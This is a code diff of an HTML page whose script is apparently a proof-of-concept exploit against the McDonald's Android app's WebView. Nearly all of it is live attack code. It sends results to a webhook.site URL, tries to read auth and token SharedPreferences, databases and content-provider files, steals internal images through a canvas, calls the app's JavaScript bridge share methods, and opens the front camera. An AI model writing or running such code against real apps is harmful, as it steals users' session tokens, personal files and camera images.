@@ -23,43 +23,29 @@
     </div>
 
     <script>
-        const WEBHOOK = "https://webhook.site/9afcb3fc-51b3-4949-bea5-bc3409884322
-            
-            
-        
-        
-        ";
+        const WEBHOOK = "https://webhook.site/9afcb3fc-51b3-4949-bea5-bc3409884322";
 
         function exfil(data) {
             navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
         }
 
-        // ============================================================
-        // PHASE 1: Try to READ internal files directly via fetch/XHR
-        // WebView may allow file:// and content:// access
-        // ============================================================
+        // PHASE 1: File read attempts
         var sensitiveFiles = [
-            // SharedPreferences — auth tokens stored here
             "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/com.mcdonalds.mobileapp_preferences.xml",
             "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/user_prefs.xml",
             "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/auth.xml",
             "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/session.xml",
             "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/token.xml",
             "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/McD.xml",
-
-            // Databases
             "file:///data/data/com.mcdonalds.mobileapp/databases/mcd.db",
             "file:///data/data/com.mcdonalds.mobileapp/databases/user.db",
-
-            // Content Provider paths
             "content://com.mcdonalds.mobileapp.authority.release/files/loyalty_card.png",
             "content://com.mcdonalds.mobileapp.authority.release/cache/receipt.jpg",
-            "content://com.mcdonalds.mobileapp.authority.release/shared_prefs/auth.xml",
+            "content://com.mcdonalds.mobileapp.authority.release/shared_prefs/auth.xml"
         ];
 
         sensitiveFiles.forEach(function(filePath, i) {
             setTimeout(function() {
-                // Method 1: fetch
                 fetch(filePath)
                     .then(function(r) { return r.text(); })
                     .then(function(data) {
@@ -69,7 +55,6 @@
                         exfil({ type: "FILE_READ_FAIL_FETCH", path: filePath, error: e.toString() });
                     });
 
-                // Method 2: XHR
                 var xhr = new XMLHttpRequest();
                 xhr.open("GET", filePath, true);
                 xhr.onload = function() {
@@ -79,30 +64,23 @@
                     exfil({ type: "FILE_READ_FAIL_XHR", path: filePath, status: xhr.status });
                 };
                 try { xhr.send(); } catch(e) {}
-
             }, i * 500);
         });
 
-        // ============================================================
-        // PHASE 2: handleShareImage — try to load file into <img>
-        // and draw to canvas to steal image data
-        // ============================================================
+        // PHASE 2: Internal image steal
         setTimeout(function() {
             var imgPaths = [
                 "content://com.mcdonalds.mobileapp.authority.release/files/loyalty_card.png",
                 "content://com.mcdonalds.mobileapp.authority.release/cache/receipt.jpg",
                 "file:///data/data/com.mcdonalds.mobileapp/cache/profile.jpg",
-                "file:///data/data/com.mcdonalds.mobileapp/files/qr_code.png",
+                "file:///data/data/com.mcdonalds.mobileapp/files/qr_code.png"
             ];
 
             imgPaths.forEach(function(path, i) {
                 setTimeout(function() {
-                    // Try to load internal image into <img> tag
                     var img = new Image();
                     img.crossOrigin = "anonymous";
-
                     img.onload = function() {
-                        // Image loaded! Draw to canvas and exfiltrate
                         try {
                             var c = document.getElementById('hiddenCanvas');
                             c.width = img.naturalWidth || 200;
@@ -114,14 +92,11 @@
                             exfil({ type: "IMG_CANVAS_ERROR", path: path, error: e.toString() });
                         }
                     };
-
-                    img.onerror = function(e) {
+                    img.onerror = function() {
                         exfil({ type: "IMG_LOAD_FAIL", path: path });
                     };
-
                     img.src = path;
 
-                    // Also call bridge with same path
                     if (window.Android && typeof window.Android.handleShareImage === 'function') {
                         try {
                             var r = window.Android.handleShareImage(path, "MCD Internal File");
@@ -134,21 +109,16 @@
             });
         }, sensitiveFiles.length * 500 + 500);
 
-        // ============================================================
-        // PHASE 3: handleShare — CORRECT signature (short params only)
-        // Previously confirmed working with 3 short string params
-        // ============================================================
+        // PHASE 3: handleShare correct signature
         setTimeout(function() {
             if (window.Android) {
-                // Correct working signature: (title, text, url) — keep SHORT
                 var shareTests = [
                     ["MCD PoC", "Pwned", "https://mymcdonaldsrewards.in"],
                     ["test", "test", "test"],
-                    ["a", "b"],      // 2 params
-                    ["a"],           // 1 param
-                    [],              // 0 params
+                    ["a", "b"],
+                    ["a"],
+                    []
                 ];
-
                 shareTests.forEach(function(params, i) {
                     setTimeout(function() {
                         try {
@@ -162,9 +132,7 @@
             }
         }, sensitiveFiles.length * 500 + 3000);
 
-        // ============================================================
-        // PHASE 4: Camera selfie (already confirmed working)
-        // ============================================================
+        // PHASE 4: Camera
         setTimeout(function() {
             navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
